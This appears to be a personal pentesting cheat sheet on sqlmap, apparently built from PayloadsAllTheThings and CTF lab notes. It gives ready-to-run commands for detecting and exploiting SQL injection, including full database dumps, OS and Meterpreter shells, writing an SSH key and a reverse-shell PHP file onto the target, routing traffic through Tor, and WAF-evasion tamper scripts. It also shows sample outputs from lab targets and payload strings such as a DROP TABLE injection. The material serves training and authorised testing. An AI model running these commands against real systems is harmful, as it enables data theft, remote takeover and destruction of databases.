---
title: Sqlmap 🪲
tags:
  - Tool
---
## Suported SQLi types

The technique characters `BEUSTQ` refers to the following:

- `B`: Boolean-based blind, `AND 1=1`
- `E`: Error-based, `AND GTID_SUBSET(@@version,0)`
- `U`: Union query-based, `UNION ALL SELECT 1,@@version,3`
- `S`: Stacked queries, `; DROP TABLE users`
- `T`: Time-based blind, `AND 1=IF(2>1,SLEEP(5),0)`
- `Q`: Inline queries, `SELECT (SELECT @@version) from`

## PayloadsAllTheThings Commands
### Basic arguments for SQLmap

```powershell
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```

### Load a request file and use mobile user-agent

```powershell
sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1
```

### Custom injection in UserAgent/Header/Referer/Cookie

```powershell
python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
The injection is located at the '*'
```

### Second order injection

```powershell
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```

### Shell

- SQL Shell: `python sqlmap.py -u "http://example.com/?id=1" -p id --sql-shell`
- OS Shell: `python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell`
- Meterpreter: `python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn`
- SSH Shell: `python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/`

### Crawl a website with SQLmap and auto-exploit

```powershell
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```

### Using TOR with SQLmap

```powershell
sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
```

### Using a proxy with SQLmap

```powershell
sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
```

### Using Chrome cookie and a Proxy

```powershell
sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3
```

### Using suffix to tamper the injection

```powershell
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```

### General tamper option and tamper's list

```powershell
tamper=name_of_the_tamper
```

|Tamper|Description|
|---|---|
|0x2char.py|Replaces each (MySQL) 0x encoded string with equivalent CONCAT(CHAR(),…) counterpart|
|apostrophemask.py|Replaces apostrophe character with its UTF-8 full width counterpart|
|apostrophenullencode.py|Replaces apostrophe character with its illegal double unicode counterpart|
|appendnullbyte.py|Appends encoded NULL byte character at the end of payload|
|base64encode.py|Base64 all characters in a given payload|
|between.py|Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #'|
|bluecoat.py|Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator|
|chardoubleencode.py|Double url-encodes all characters in a given payload (not processing already encoded)|
|charencode.py|URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54)|
|charunicodeencode.py|Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)|
|charunicodeescape.py|Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054)|
|commalesslimit.py|Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'|
|commalessmid.py|Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'|
|commentbeforeparentheses.py|Prepends (inline) comment before parentheses (e.g. ( -> /**/()|
|concat2concatws.py|Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|
|charencode.py|Url-encodes all characters in a given payload (not processing already encoded)|
|charunicodeencode.py|Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)|
|equaltolike.py|Replaces all occurrences of operator equal ('=') with operator 'LIKE'|
|escapequotes.py|Slash escape quotes (' and ")|
|greatest.py|Replaces greater than operator ('>') with 'GREATEST' counterpart|
|halfversionedmorekeywords.py|Adds versioned MySQL comment before each keyword|
|htmlencode.py|HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -> ')|
|ifnull2casewhenisnull.py|Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart|
|ifnull2ifisnull.py|Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|
|informationschemacomment.py|Add an inline comment (/**/) to the end of all occurrences of (MySQL) “information_schema” identifier|
|least.py|Replaces greater than operator (‘>’) with ‘LEAST’ counterpart|
|lowercase.py|Replaces each keyword character with lower case value (e.g. SELECT -> select)|
|modsecurityversioned.py|Embraces complete query with versioned comment|
|modsecurityzeroversioned.py|Embraces complete query with zero-versioned comment|
|multiplespaces.py|Adds multiple spaces around SQL keywords|
|nonrecursivereplacement.py|Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters|
|overlongutf8.py|Converts all characters in a given payload (not processing already encoded)|
|overlongutf8more.py|Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)|
|percentage.py|Adds a percentage sign ('%') infront of each character|
|plus2concat.py|Replaces plus operator (‘+’) with (MsSQL) function CONCAT() counterpart|
|plus2fnconcat.py|Replaces plus operator (‘+’) with (MsSQL) ODBC function {fn CONCAT()} counterpart|
|randomcase.py|Replaces each keyword character with random case value|
|randomcomments.py|Add random comments to SQL keywords|
|securesphere.py|Appends special crafted string|
|sp_password.py|Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs|
|space2comment.py|Replaces space character (' ') with comments|
|space2dash.py|Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')|
|space2hash.py|Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')|
|space2morehash.py|Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')|
|space2mssqlblank.py|Replaces space character (' ') with a random blank character from a valid set of alternate characters|
|space2mssqlhash.py|Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')|
|space2mysqlblank.py|Replaces space character (' ') with a random blank character from a valid set of alternate characters|
|space2mysqldash.py|Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')|
|space2plus.py|Replaces space character (' ') with plus ('+')|
|space2randomblank.py|Replaces space character (' ') with a random blank character from a valid set of alternate characters|
|symboliclogical.py|Replaces AND and OR logical operators with their symbolic counterparts (&& and|
|unionalltounion.py|Replaces UNION ALL SELECT with UNION SELECT|
|unmagicquotes.py|Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work)|
|uppercase.py|Replaces each keyword character with upper case value 'INSERT'|
|varnish.py|Append a HTTP header 'X-originating-IP'|
|versionedkeywords.py|Encloses each non-function keyword with versioned MySQL comment|
|versionedmorekeywords.py|Encloses each keyword with versioned MySQL comment|
|xforwardedfor.py|Append a fake HTTP header 'X-Forwarded-For'|

### SQLmap without SQL injection

You can use SQLmap to access a database via its port instead of a URL.

```powershell
sqlmap.py -d "mysql://user:pass@ip/database" --dump-all 
```

---

```shell
sqlmap http://10.10.134.119/admin?user=3 --cookie='token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDc1NzM3Mzh9.EQ-QxUbiFb5WYxEP6e8izPs_r4iGouEevWSjuhE1ZaM' --technique=U --delay=2 --dump
```

- Command with a request with no query params on url:
	- First, copy the request captured with Burp to a file
	- Then:

```shell
sqlmap -r request.txt

# Then do
sqlmap -r request.txt --dbs

# Attack the database you want

sqlmap -r request.txt -D <TABLE_NAME> --tables --dump

# a more complete command
sqlmap -r request.txt -p 'email' --dbms=mysql --level=3 --risk=3 --batch --technique=BUT --dbs --dump --threads 3
```

---

## Get a reverse shell with slqmap:

```shell
sqlmap -r request.txt --dbs --file-dest=/var/www/html/reverse.php --file-write=./reverse.php
```

- Now open open your browser: `http://IP_HOST/reverse.php`

---
## Display databases when performing a successful attack

If you got a successful payload, then do this:
- Extract databases by adding `--dbs` to the original attack:
	- Just say `y` and will load the previous results.

```shell
sqlmap -u 'http://domain.com/path' -H 'X-Forwarded-For: YOUR_IP*' --risk 3 --level 5 --dbms MySQL --dbs

# Output may be like:
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[22:27:40] [INFO] fetching database names
[22:27:40] [INFO] fetching number of databases
[22:27:40] [INFO] retrieved: 2
[22:27:42] [INFO] retrieved: informati
on_schema
[22:28:47] [INFO] retrieved: sqhell_1
available databases [2]:
[*] information_schema
[*] sqhell_1
```

- Now that you know the databases, get the tables of the one you are interested:

```shell
sqlmap -u 'http://domain.com/path' -H 'X-Forwarded-For: YOUR_IP*' --risk 3 --level 5 --dbms MySQL -D DATBASE_NAME --tables

# Output may be like:
[22:31:23] [INFO] retrieved: 
[22:31:28] [INFO] adjusting time delay to 1 second due to good response times
flag
[22:31:41] [INFO] retrieved: hits
Database: sqhell_1
[2 tables]
+------+
| flag |
| hits |
+------+
```

- Now list columns of a database table:

```shell
sqlmap -u 'http://domain.com/path' -H 'X-Forwarded-For: YOUR_IP*' --risk 3 --level 5 --dbms MySQL -D DATBASE_NAME -T TABLE --columns

# Output may be like:
[22:33:58] [INFO] retrieved: 
[22:34:03] [INFO] adjusting time delay to 1 second due to good response times
id
[22:34:09] [INFO] retrieved: int
[22:34:21] [INFO] retrieved: flag
[22:34:35] [INFO] retrieved: varchar(250)
Database: sqhell_1
Table: flag
[2 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(250) |
| id     | int          |
+--------+--------------+
```

- Now dump it the table's column:

```shell
sqlmap -u 'http://domain.com/path' -H 'X-Forwarded-For: YOUR_IP*' --risk 3 --level 5 --dbms MySQL -D DATBASE_NAME -T TABLE -C COLUMN --dump

# Output may be like:

[22:36:07] [INFO] adjusting time delay to 1 second due to good response times
THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}
Database: sqhell_1
Table: flag
[1 entry]
+---------------------------------------------+
| flag                                        |
+---------------------------------------------+
| XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
+---------------------------------------------+
```

## Register forms

```shell
sqlmap -u 'http://domain.com/register/user-check?username=gitblanc' -p username --risk 3 --level 5 --dbms MySQL

# Output may be like:
[22:53:35] [INFO] checking if the injection point on GET parameter 'username' is a false positive
GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 468 HTTP(s) requests:
---
Parameter: username (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-3381' OR 3435=3435-- ihVx

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=gitblanc' AND (SELECT 8410 FROM (SELECT(SLEEP(5)))sPpn)-- xphf
---
```

- Then you can try to obtain databases by adding at the end `--dbs`
- Then obtain tables by adding `-D DATBASE_NAME --tables` replacing `--dbs`
- Then obtain columns by adding `-T TABLE --columns` replacing `--tables`
- Then dump a columns by adding `-C COLUMN --dump` replacing `--columns`

## URL parameters

- If you find something like: `http://10.10.115.157/user?id=1`
- Try this:

```shell
sqlmap -u 'http://10.10.115.157/user?id=1' -p id --risk 3 --level 5 --dbms MySQL

# Output may be like:
[23:02:27] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3835=3835

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 5327 FROM (SELECT(SLEEP(5)))tHWS)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-4293 UNION ALL SELECT CONCAT(0x7162787171,0x5648626b46674875456f46496a4c746c5a4e4462736575774246467a477a70414d655351486f546e,0x717a707671),NULL,NULL-- -
---

```

## Log Messages Description

#### URL content is stable

`Log Message:`

- "target URL content is stable"

This means that there are no major changes between responses in case of continuous identical requests. This is important from the automation point of view since, in the event of stable responses, it is easier to spot differences caused by the potential SQLi attempts. While stability is important, SQLMap has advanced mechanisms to automatically remove the potential "noise" that could come from potentially unstable targets.

#### Parameter appears to be dynamic

`Log Message:`

- "GET parameter 'id' appears to be dynamic"

It is always desired for the tested parameter to be "dynamic," as it is a sign that any changes made to its value would result in a change in the response; hence the parameter may be linked to a database. In case the output is "static" and does not change, it could be an indicator that the value of the tested parameter is not processed by the target, at least in the current context.

#### Parameter might be injectable

`Log Message:` "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"

As discussed before, DBMS errors are a good indication of the potential SQLi. In this case, there was a MySQL error when SQLMap sends an intentionally invalid value was used (e.g. `?id=1",)..).))'`), which indicates that the tested parameter could be SQLi injectable and that the target could be MySQL. It should be noted that this is not proof of SQLi, but just an indication that the detection mechanism has to be proven in the subsequent run.

#### Parameter might be vulnerable to XSS attacks

`Log Message:`

- "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"

While it is not its primary purpose, SQLMap also runs a quick heuristic test for the presence of an XSS vulnerability. In large-scale tests, where a lot of parameters are being tested with SQLMap, it is nice to have these kinds of fast heuristic checks, especially if there are no SQLi vulnerabilities found.

#### Back-end DBMS is '...'

`Log Message:`

- "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"

In a normal run, SQLMap tests for all supported DBMSes. In case that there is a clear indication that the target is using the specific DBMS, we can narrow down the payloads to just that specific DBMS.

#### Level/risk values

`Log Message:`

- "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"

If there is a clear indication that the target uses the specific DBMS, it is also possible to extend the tests for that same specific DBMS beyond the regular tests.  
This basically means running all SQL injection payloads for that specific DBMS, while if no DBMS were detected, only top payloads would be tested.

#### Reflective values found

`Log Message:`

- "reflective value(s) found and filtering out"

Just a warning that parts of the used payloads are found in the response. This behavior could cause problems to automation tools, as it represents the junk. However, SQLMap has filtering mechanisms to remove such junk before comparing the original page content.

#### Parameter appears to be injectable

`Log Message:`

- "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"

This message indicates that the parameter appears to be injectable, though there is still a chance for it to be a false-positive finding. In the case of boolean-based blind and similar SQLi types (e.g., time-based blind), where there is a high chance of false-positives, at the end of the run, SQLMap performs extensive testing consisting of simple logic checks for removal of false-positive findings.

Additionally, `with --string="luther"` indicates that SQLMap recognized and used the appearance of constant string value `luther` in the response for distinguishing `TRUE` from `FALSE` responses. This is an important finding because in such cases, there is no need for the usage of advanced internal mechanisms, such as dynamicity/reflection removal or fuzzy comparison of responses, which cannot be considered as false-positive.

#### Time-based comparison statistical model

`Log Message:`

- "time-based comparison requires a larger statistical model, please wait........... (done)"

SQLMap uses a statistical model for the recognition of regular and (deliberately) delayed target responses. For this model to work, there is a requirement to collect a sufficient number of regular response times. This way, SQLMap can statistically distinguish between the deliberate delay even in the high-latency network environments.

#### Extending UNION query injection technique tests

`Log Message:`

- "automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"

UNION-query SQLi checks require considerably more requests for successful recognition of usable payload than other SQLi types. To lower the testing time per parameter, especially if the target does not appear to be injectable, the number of requests is capped to a constant value (i.e., 10) for this type of check. However, if there is a good chance that the target is vulnerable, especially as one other (potential) SQLi technique is found, SQLMap extends the default number of requests for UNION query SQLi, because of a higher expectancy of success.

#### Technique appears to be usable

`Log Message:`

- "ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"

As a heuristic check for the UNION-query SQLi type, before the actual `UNION` payloads are sent, a technique known as `ORDER BY` is checked for usability. In case that it is usable, SQLMap can quickly recognize the correct number of required `UNION` columns by conducting the binary-search approach.

#### Parameter is vulnerable

`Log Message:`

- "GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"

This is one of the most important messages of SQLMap, as it means that the parameter was found to be vulnerable to SQL injections. In the regular cases, the user may only want to find at least one injection point (i.e., parameter) usable against the target. However, if we were running an extensive test on the web application and want to report all potential vulnerabilities, we can continue searching for all vulnerable parameters.

#### Sqlmap identified injection points

`Log Message:`

- "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"

Following after is a listing of all injection points with type, title, and payloads, which represents the final proof of successful detection and exploitation of found SQLi vulnerabilities. It should be noted that SQLMap lists only those findings which are provably exploitable (i.e., usable).

#### Data logged to text files

`Log Message:`

- "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"

This indicates the local file system location used for storing all logs, sessions, and output data for a specific target - in this case, `www.example.com`. After such an initial run, where the injection point is successfully detected, all details for future runs are stored inside the same directory's session files. This means that SQLMap tries to reduce the required target requests as much as possible, depending on the session files' data.

## cURL Commands

One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing `Copy as cURL` feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools:

![](Pasted%20image%2020240729083333.png)

By pasting the clipboard content (`Ctrl-V`) into the command line, and changing the original command `curl` to `sqlmap`, we are able to use SQLMap with the identical `curl` command:

```shell
gitblanc@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. `--crawl`, `--forms` or `-g`).

## GET/POST Requests

In the most common scenario, `GET` parameters are provided with the usage of option `-u`/`--url`, as in the previous example. As for testing `POST` data, the `--data` flag can be used, as follows:

```shell
gitblanc@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

In such cases, `POST` parameters `uid` and `name` will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameter `uid` is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using `-p uid`. Otherwise, we could mark it inside the provided data with the usage of special marker `*` as follows:

```shell
gitblanc@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

## Full HTTP Requests

Copy it into a file from Burp and then run:

```shell
gitblanc@htb[/htb]$ sqlmap -r req.txt
```

>[!Tip]
>Similarly to the case with the `--data` option, within the saved request file, we can specify the parameter we want to inject in with an asterisk `(*)`, such as `/?id=*`.

## Display Errors

Use `--parse-errors`

## Store the traffic

The `-t` option stores the whole traffic content to an output file:

```shell
gitblanc@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt

gitblanc@htb[/htb]$ cat /tmp/traffic.txt
HTTP request [#1]:
GET /?id=1 HTTP/1.1
Host: www.example.com
Cache-control: no-cache
Accept-encoding: gzip,deflate
Accept: */*
User-agent: sqlmap/1.4.9 (http://sqlmap.org)
Connection: close

HTTP response [#1] (200 OK):
Date: Thu, 24 Sep 2020 14:12:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 914
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://www.example.com:80/?id=1

<!DOCTYPE html>
<html lang="en">
...SNIP...
```

## Using Proxy

Finally, we can utilize the `--proxy` option to redirect the whole traffic through a (MiTM) proxy (e.g., `Burp`). This will route all SQLMap traffic through `Burp`, so that we can later manually investigate all requests, repeat them, and utilize all features of `Burp` with these requests:

![](Pasted%20image%2020240729092237.png)

## Prefixes and Suffixes

There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.  
For such runs, options `--prefix` and `--suffix` can be used as follows:

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

## Level/Risk

By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.

For such demands, the options `--level` and `--risk` should be used:

- The option `--level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
- The option `--risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

The best way to check for differences between used boundaries and payloads for different values of `--level` and `--risk`, is the usage of `-v` option to set the verbosity level. In verbosity 3 or higher (e.g. `-v 3`), messages containing the used `[PAYLOAD]` will be displayed, as follows:

```shell
gitblanc@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

On the other hand, payloads used with the default `--level` value have a considerably smaller set of boundaries:

```shell
gitblanc@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3
```

## Advanced Tuning

### Status Codes

For example, when dealing with a huge target response with a lot of dynamic content, subtle differences between `TRUE` and `FALSE` responses could be used for detection purposes. If the difference between `TRUE` and `FALSE` responses can be seen in the HTTP codes (e.g. `200` for `TRUE` and `500` for `FALSE`), the option `--code` could be used to fixate the detection of `TRUE` responses to a specific HTTP code (e.g. `--code=200`).

### Titles

If the difference between responses can be seen by inspecting the HTTP page titles, the switch `--titles` could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag `<title>`.

### Strings

In case of a specific string value appearing in `TRUE` responses (e.g. `success`), while absent in `FALSE` responses, the option `--string` could be used to fixate the detection based only on the appearance of that single value (e.g. `--string=success`).

### Text-only

When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g. `<script>`, `<style>`, `<meta>`, etc.), we can use the `--text-only` switch, which removes all the HTML tags, and bases the comparison only on the textual (i.e., visible) content.

### Techniques

In some special cases, we have to narrow down the used payloads only to a certain type. For example, if the time-based blind payloads are causing trouble in the form of response timeouts, or if we want to force the usage of a specific SQLi payload type, the option `--technique` can specify the SQLi technique to be used.

For example, if we want to skip the time-based blind and stacking SQLi payloads and only test for the boolean-based blind, error-based, and UNION-query payloads, we can specify these techniques with `--technique=BEU`.

### UNION SQLi Tuning

In some cases, `UNION` SQLi payloads require extra user-provided information to work. If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option `--union-cols` (e.g. `--union-cols=17`). In case that the default "dummy" filling values used by SQLMap -`NULL` and random integer- are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead (e.g. `--union-char='a'`).

Furthermore, in case there is a requirement to use an appendix at the end of a `UNION` query in the form of the `FROM <table>` (e.g., in case of Oracle), we can set it with the option `--union-from` (e.g. `--union-from=users`).  
Failing to use the proper `FROM` appendix automatically could be due to the inability to detect the DBMS name before its usage.

